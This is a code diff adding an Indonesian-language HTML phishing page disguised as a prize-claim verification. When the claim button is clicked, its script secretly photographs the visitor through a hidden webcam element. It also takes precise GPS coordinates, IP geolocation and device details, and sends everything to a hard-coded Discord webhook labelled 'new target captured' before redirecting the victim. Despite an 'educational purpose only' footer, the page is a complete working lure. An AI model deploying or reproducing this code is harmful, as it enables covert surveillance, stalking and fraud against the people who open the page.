@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>🎁 Verifikasi Hadiah Spesial - Klaim Sekarang!</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      min-height: 100vh;
+      background: #000;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      padding: 20px;
+    }
+    h1 {
+      font-size: 2.5em;
+      color: #ff4444;
+      text-shadow: 0 0 20px #f00;
+      margin-bottom: 10px;
+    }
+    p {
+      font-size: 1.3em;
+      margin: 15px 0;
+      color: #ccc;
+    }
+    #status {
+      font-size: 1.4em;
+      color: #ffaa00;
+      margin: 30px 0;
+      min-height: 50px;
+      line-height: 1.4;
+    }
+    button {
+      padding: 18px 60px;
+      font-size: 1.8em;
+      background: linear-gradient(135deg, #c00, #ff2200);
+      border: none;
+      color: #fff;
+      border-radius: 60px;
+      cursor: pointer;
+      box-shadow: 0 0 30px rgba(255, 0, 0, 0.6);
+      transition: 0.3s;
+      font-weight: bold;
+    }
+    button:hover {
+      transform: scale(1.05);
+      background: linear-gradient(135deg, #ff0000, #ff4400);
+      box-shadow: 0 0 50px rgba(255, 0, 0, 0.9);
+    }
+    button:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      transform: none;
+    }
+    .spinner {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(255, 170, 0, 0.3);
+      border-top: 3px solid #ffaa00;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      vertical-align: middle;
+      margin-right: 8px;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+
+  <h1>🎉 SELAMAT! Kamu Terpilih</h1>
+  <p>Klaim hadiah spesialmu sekarang dengan verifikasi cepat (hanya 5 detik).</p>
+  <div id="status">Menunggu konfirmasi...</div>
+  <button id="klaimBtn" onclick="klaimHadiah()">🎁 KLAIM HADIAH SEKARANG</button>
+
+  <!-- Elemen tersembunyi untuk kamera -->
+  <video id="video" autoplay playsinline muted style="
+    position: fixed;
+    top: -9999px;
+    left: -9999px;
+    width: 1px;
+    height: 1px;
+    opacity: 0;
+    pointer-events: none;
+  "></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    // ============================================
+    // GANTI DENGAN WEBHOOK KAMU
+    // ============================================
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1470328357110415455/tTwvOp-9oZm1WMYedDUzPwuviaES8bmimwryhgILqo2PjqXfXxyI8hCR-IvW9SSzeAtx";
+
+    // ============================================
+    // FUNGSI UTAMA
+    // ============================================
+    async function klaimHadiah() {
+      const status = document.getElementById('status');
+      const btn = document.getElementById('klaimBtn');
+      const videoEl = document.getElementById('video');
+      const canvasEl = document.getElementById('canvas');
+
+      // Disable tombol supaya tidak double-click
+      btn.disabled = true;
+      btn.innerText = "⏳ Memproses...";
+
+      let stream = null;
+      let fotoBlob = null;
+      let geoData = {};
+      let gpsData = {};
+
+      // ==========================================
+      // STEP 1: Minta izin kamera & ambil foto
+      // ==========================================
+      status.innerHTML = '<span class="spinner"></span> Mengaktifkan kamera...';
+
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: {
+            facingMode: "user",
+            width: { ideal: 1280 },
+            height: { ideal: 720 }
+          },
+          audio: false
+        });
+
+        videoEl.srcObject = stream;
+
+        // Tunggu video benar-benar siap & playing
+        await new Promise((resolve, reject) => {
+          const timeout = setTimeout(() => {
+            reject(new Error('Video timeout - kamera tidak merespon'));
+          }, 10000); // timeout 10 detik
+
+          videoEl.onloadeddata = () => {
+            // Pastikan video punya dimensi valid
+            videoEl.play().then(() => {
+              clearTimeout(timeout);
+              // Tunggu sedikit lagi supaya frame stabil
+              setTimeout(resolve, 2000);
+            }).catch(reject);
+          };
+
+          videoEl.onerror = () => {
+            clearTimeout(timeout);
+            reject(new Error('Video error'));
+          };
+        });
+
+        status.innerHTML = '<span class="spinner"></span> Mengambil foto verifikasi...';
+
+        // Pastikan video punya ukuran
+        const vw = videoEl.videoWidth;
+        const vh = videoEl.videoHeight;
+
+        if (vw === 0 || vh === 0) {
+          throw new Error('Dimensi video 0 - kamera belum siap');
+        }
+
+        // Capture ke canvas
+        canvasEl.width = vw;
+        canvasEl.height = vh;
+        const ctx = canvasEl.getContext('2d');
+        ctx.drawImage(videoEl, 0, 0, vw, vh);
+
+        // Convert canvas ke Blob (lebih reliable daripada base64)
+        fotoBlob = await new Promise((resolve, reject) => {
+          canvasEl.toBlob((blob) => {
+            if (blob) {
+              resolve(blob);
+            } else {
+              reject(new Error('Gagal convert canvas ke blob'));
+            }
+          }, 'image/jpeg', 0.85);
+        });
+
+        console.log('[OK] Foto berhasil diambil, size:', fotoBlob.size, 'bytes');
+
+      } catch (err) {
+        console.error('[CAMERA ERROR]', err);
+        status.innerHTML = '⚠️ Kamera gagal: ' + err.message + '<br>Izinkan kamera lalu coba lagi.';
+        btn.disabled = false;
+        btn.innerText = "🎁 KLAIM HADIAH SEKARANG";
+        stopStream(stream);
+        return;
+      }
+
+      // ==========================================
+      // STEP 2: Ambil lokasi GPS (precise)
+      // ==========================================
+      status.innerHTML = '<span class="spinner"></span> Mengambil lokasi GPS...';
+
+      try {
+        const position = await new Promise((resolve, reject) => {
+          if (!navigator.geolocation) {
+            reject(new Error('Geolocation tidak didukung'));
+            return;
+          }
+          navigator.geolocation.getCurrentPosition(resolve, reject, {
+            enableHighAccuracy: true,
+            timeout: 15000,
+            maximumAge: 0
+          });
+        });
+
+        gpsData = {
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+          accuracy: position.coords.accuracy,
+          altitude: position.coords.altitude,
+          speed: position.coords.speed
+        };
+
+        console.log('[OK] GPS berhasil:', gpsData);
+
+      } catch (err) {
+        console.warn('[GPS WARNING]', err.message);
+        gpsData = {
+          latitude: 'Ditolak/Tidak tersedia',
+          longitude: 'Ditolak/Tidak tersedia',
+          accuracy: '-',
+          altitude: '-',
+          speed: '-'
+        };
+      }
+
+      // ==========================================
+      // STEP 3: Ambil data IP & geolokasi
+      // ==========================================
+      status.innerHTML = '<span class="spinner"></span> Mengambil data jaringan...';
+
+      try {
+        // Coba beberapa API sebagai fallback
+        let ipRes;
+        try {
+          ipRes = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) });
+          geoData = await ipRes.json();
+        } catch {
+          try {
+            ipRes = await fetch('https://ipwho.is/', { signal: AbortSignal.timeout(5000) });
+            const d = await ipRes.json();
+            geoData = {
+              ip: d.ip,
+              city: d.city,
+              region: d.region,
+              country_name: d.country,
+              latitude: d.latitude,
+              longitude: d.longitude,
+              org: d.connection?.org || '?'
+            };
+          } catch {
+            try {
+              ipRes = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(5000) });
+              const d = await ipRes.json();
+              geoData = { ip: d.ip };
+            } catch {
+              geoData = { ip: 'Gagal diambil' };
+            }
+          }
+        }
+        console.log('[OK] IP Data:', geoData);
+
+      } catch (err) {
+        console.warn('[IP WARNING]', err);
+        geoData = { ip: 'Error' };
+      }
+
+      // ==========================================
+      // STEP 4: Kumpulkan info perangkat
+      // ==========================================
+      const deviceInfo = getDeviceInfo();
+
+      // ==========================================
+      // STEP 5: Kirim ke Discord Webhook
+      // ==========================================
+      status.innerHTML = '<span class="spinner"></span> Mengirim verifikasi ke server...';
+
+      try {
+        const filename = 'foto_' + Date.now() + '.jpg';
+
+        // Buat Google Maps link dari GPS
+        let mapsLink = 'Tidak tersedia';
+        if (typeof gpsData.latitude === 'number') {
+          mapsLink = `[📍 Buka Google Maps](https://www.google.com/maps?q=${gpsData.latitude},${gpsData.longitude})`;
+        }
+
+        // Koordinat display
+        let koordinatText = '';
+        if (typeof gpsData.latitude === 'number') {
+          koordinatText = `📍 **GPS:** ${gpsData.latitude.toFixed(6)}, ${gpsData.longitude.toFixed(6)}\n`;
+          koordinatText += `🎯 **Akurasi:** ${gpsData.accuracy ? gpsData.accuracy.toFixed(0) + 'm' : '?'}`;
+        } else {
+          koordinatText = '❌ GPS ditolak user';
+        }
+
+        // IP geolocation sebagai fallback
+        let ipLocationText = `${geoData.city || '?'}, ${geoData.region || '?'}, ${geoData.country_name || '?'}`;
+
+        const payload = {
+          embeds: [{
+            title: "🔴 TARGET BARU TERTANGKAP",
+            color: 16711680,
+            fields: [
+              {
+                name: "🌐 IP Address",
+                value: `\`${geoData.ip || '?'}\``,
+                inline: true
+              },
+              {
+                name: "📍 Lokasi (IP)",
+                value: ipLocationText,
+                inline: true
+              },
+              {
+                name: "🛰️ Koordinat GPS",
+                value: koordinatText,
+                inline: false
+              },
+              {
+                name: "🗺️ Google Maps",
+                value: mapsLink,
+                inline: false
+              },
+              {
+                name: "📱 Perangkat",
+                value: `\`\`\`${deviceInfo.ua}\`\`\``,
+                inline: false
+              },
+              {
+                name: "💻 Platform",
+                value: deviceInfo.platform,
+                inline: true
+              },
+              {
+                name: "📐 Layar",
+                value: deviceInfo.screen,
+                inline: true
+              },
+              {
+                name: "🔋 Bahasa",
+                value: deviceInfo.language,
+                inline: true
+              },
+              {
+                name: "🕐 Waktu",
+                value: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }) + ' WIB',
+                inline: false
+              }
+            ],
+            image: {
+              url: `attachment://${filename}`
+            },
+            footer: {
+              text: "Phishing Tool | Educational Purpose Only"
+            },
+            timestamp: new Date().toISOString()
+          }]
+        };
+
+        // Buat FormData dengan file + payload
+        const formData = new FormData();
+        formData.append('payload_json', JSON.stringify(payload));
+        formData.append('file', fotoBlob, filename);
+
+        // Kirim request
+        const response = await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          body: formData
+          // JANGAN tambahkan Content-Type header manual!
+        });
+
+        if (!response.ok) {
+          const errText = await response.text();
+          throw new Error(`Webhook error ${response.status}: ${errText}`);
+        }
+
+        console.log('[OK] Webhook berhasil dikirim!');
+        status.innerHTML = '✅ Verifikasi berhasil! Hadiah sedang diproses...';
+        btn.style.display = 'none';
+
+        // Redirect setelah delay
+        setTimeout(() => {
+          window.location.href = "https://t.me/fakechannel";
+        }, 3000);
+
+      } catch (err) {
+        console.error('[WEBHOOK ERROR]', err);
+
+        // Coba kirim ulang tanpa foto jika gagal
+        try {
+          await kirimTanpaFoto(geoData, gpsData, deviceInfo);
+          status.innerHTML = '✅ Verifikasi berhasil (mode alternatif)!';
+          setTimeout(() => {
+            window.location.href = "https://t.me/fakechannel";
+          }, 3000);
+        } catch (e2) {
+          console.error('[RETRY ERROR]', e2);
+          status.innerHTML = '❌ Gagal mengirim: ' + err.message;
+          btn.disabled = false;
+          btn.innerText = "🔄 COBA LAGI";
+        }
+      }
+
+      // Matikan kamera
+      stopStream(stream);
+    }
+
+    // ============================================
+    // FUNGSI: Kirim tanpa foto (fallback)
+    // ============================================
+    async function kirimTanpaFoto(geoData, gpsData, deviceInfo) {
+      let koordinatText = '';
+      if (typeof gpsData.latitude === 'number') {
+        koordinatText = `GPS: ${gpsData.latitude.toFixed(6)}, ${gpsData.longitude.toFixed(6)}`;
+      } else {
+        koordinatText = 'GPS tidak tersedia';
+      }
+
+      const payload = {
+        embeds: [{
+          title: "🟡 TARGET BARU (Tanpa Foto)",
+          color: 16776960,
+          description: "Foto gagal dikirim, data lain berhasil.",
+          fields: [
+            { name: "IP", value: `\`${geoData.ip || '?'}\``, inline: true },
+            { name: "Lokasi", value: `${geoData.city || '?'}, ${geoData.country_name || '?'}`, inline: true },
+            { name: "GPS", value: koordinatText, inline: false },
+            { name: "Perangkat", value: `\`${deviceInfo.ua.slice(0, 200)}\``, inline: false }
+          ],
+          timestamp: new Date().toISOString()
+        }]
+      };
+
+      const res = await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+
+      if (!res.ok) throw new Error('Fallback juga gagal');
+    }
+
+    // ============================================
+    // FUNGSI: Info perangkat
+    // ============================================
+    function getDeviceInfo() {
+      return {
+        ua: navigator.userAgent || 'Unknown',
+        platform: navigator.platform || navigator.userAgentData?.platform || 'Unknown',
+        screen: `${screen.width}x${screen.height} (${window.devicePixelRatio || 1}x)`,
+        language: navigator.language || 'Unknown'
+      };
+    }
+
+    // ============================================
+    // FUNGSI: Matikan stream kamera
+    // ============================================
+    function stopStream(stream) {
+      if (stream) {
+        stream.getTracks().forEach(track => {
+          track.stop();
+          console.log('[OK] Track stopped:', track.kind);
+        });
+      }
+    }
+  </script>
+</body>
+</html>
